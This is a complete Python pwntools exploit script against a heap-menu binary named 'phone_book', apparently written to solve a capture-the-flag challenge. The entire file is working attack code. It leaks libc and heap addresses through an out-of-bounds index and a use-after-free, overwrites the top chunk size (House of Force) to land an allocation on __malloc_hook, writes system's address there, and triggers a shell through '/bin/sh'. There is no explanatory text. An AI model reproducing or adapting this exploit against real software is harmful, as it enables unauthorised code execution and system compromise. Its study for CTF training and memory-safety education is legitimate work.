#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or 'phone_book')
libc = ELF(exe.libc.path)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)
        
def create(size, name, number=b"1"):
    io.sendlineafter(b">> ", b"1")
    io.sendlineafter(b"size: ", str(size).encode())
    io.sendlineafter(b"phone number: ", number)
    io.sendlineafter(b"name: ", name)
    io.recvuntil(b"1-")
    
def leak(idx):
    io.sendlineafter(b">> ", b"2")
    io.sendlineafter(b"index: ", str(idx).encode())
    
    io.recvuntil(b"name: ")
    name = io.recvline().strip()
    
    io.recvuntil(b"number: ")
    number = io.recvline().strip()
    
    return name, number
    
def delete(idx):
    io.sendlineafter(b">> ", b"3")
    io.sendlineafter(b"index: ", str(idx).encode())
    io.recvuntil(b"1-")

gdbscript = '''
b main
'''.format(**locals())

io = start()

libcLeak, _ = leak(-6)
libcBase = u64(libcLeak.ljust(8, b"\x00")) - 0x3eba83
binsh = libcBase + next(libc.search(b"/bin/sh"))
__malloc_hook = libcBase + libc.symbols['__malloc_hook']

create(0x12, b"A"*0x10 + p64(0xffffffffffffffff))
delete(0)
heapLeak, _ = leak(0)
topChunk = u64(heapLeak.ljust(8, b"\x00")) + 0x260

distance = (__malloc_hook - 0x40) - (topChunk)
create(distance, b"X"*0)

create(40, p64(0x00)*3 + p64(libcBase + libc.symbols['system']))
io.sendlineafter(b">> ", b"1")
io.sendlineafter(b"size: ", str(binsh).encode())

io.interactive()
